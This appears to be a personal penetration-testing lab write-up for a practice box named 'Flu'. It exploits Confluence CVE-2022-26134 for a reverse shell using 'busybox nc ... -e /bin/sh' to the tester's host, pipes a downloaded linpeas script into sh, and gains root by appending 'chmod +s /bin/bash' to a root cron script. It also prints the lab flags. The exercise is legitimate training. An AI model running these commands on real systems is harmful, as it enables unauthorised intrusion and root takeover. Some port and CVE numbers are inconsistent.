# Flu
This is the first box I can confidently say I did ***NOT*** look at a walkthrough for any help on! I've included one in the details above, but it remained as a background tab the entire way through this - massive confidence boost to know I can do this without needing to follow someone else's footsteps!

Seeing Confluence when I checked the html port was a big confidence booster too, as I've worked with it a lot already and knew there were plenty of vulnerabilities and exploit available for older versions. Getting RCE was incredibly simple, and then it was simply a case of enumerating the target to find a privilege escalation vector. 

I'm building confidence with `pspy` too, although I know I need to keep it handier... and to run it with the timeout command (`timeout 20 ./pspy`) so it doesn't break my shell! As soon as I ran it and saw the running script I knew that'd be the vector I needed, but there was still a lot of uncertainty until I realised it was running every 5 mins - waited a few mins before trying `/bin/bash -p` again, and got access!

# Resolution summary
- Ran Nmap to identify ports `22` & `8080`
- Visited http (`8090`) & identified `Confluence v7.13.6`
- Identified exploit for CVE-2022-26134 and ran against target for reverse shell
- Uploaded `pspy` and identified `log-backup.sh` being run regularly by `root`
- Added command to change `/bin/bash` SUID and waited for script to run
- Ran `/bin/bash -p` to become `root`
## Improved skills
- Linux Priv Escalation
## Used tools
- nmap
- python

# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 8090 - HTTP (Confluence)
- Navigated `http://192.168.117.41:8090` and identified `Confluence 7.13.6`
![OSCP - Flu - Linux - image1](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image1.png)
	- Potentially vulnerable to CVE-2022-26134

# Exploitation
## CVE-2022-26314 - OGNL Injection
- Used `searchsploit` to identify exploit `50952.py` for CVE-2022026134. Copied exploit to local host and ran `python3 50952.py -u 192.168.117.41:8090 -c id` to test output
![OSCP - Flu - Linux - image2](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image2.png)
- Ran exploit again to establish reverse shell `python3 50952.py -u 192.168.117.41:8090 -c 'busybox nc 192.168.45.250 4444 -e /bin/sh'`
![OSCP - Flu - Linux - image3](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image3.png)
- Ran `find / -name local.txt -type f 2>/dev/null` to find `local.txt` then ran `cat /home/confluence/local.txt` to print `edf698cdc0831e7a2fd857ca3ad2191a`

![OSCP - Flu - Linux - image7](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image7.png)
- Downloaded & ran `linpeas.sh` with `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` - nothing obviously useful
![OSCP - Flu - Linux - image8](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image8.png)
- Ran `cat /home/confluence/.bash_history` to check bash history

# Privilege Escalation
## Local Enumeration
- Downloaded & ran `pspy32` - identified `/opt/log-backup.sh` being run regularly by `root`
![OSCP - Flu - Linux - image10](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image10.png)
- Ran `ls -lah /opt/log-backup.sh` to check script privileges
![OSCP - Flu - Linux - image11](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image11.png)
## Privilege Escalation vector
- Ran `echo "chmod +s /bin/bash" >> /opt/log-backup.sh` & confirmed written to `/opt/log-backup.sh`
![OSCP - Flu - Linux - image12](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image12.png)
- Waited several minutes for script, then ran `/bin/bash -p` for privileged shell as `root`
![OSCP - Flu - Linux - image13](/files/OSCP%20-%20Flu%20-%20Linux%20-%20image13.png)
- Ran `cat /root/proof.txt` to print `7b793953252334bfadee03b30874aee2`
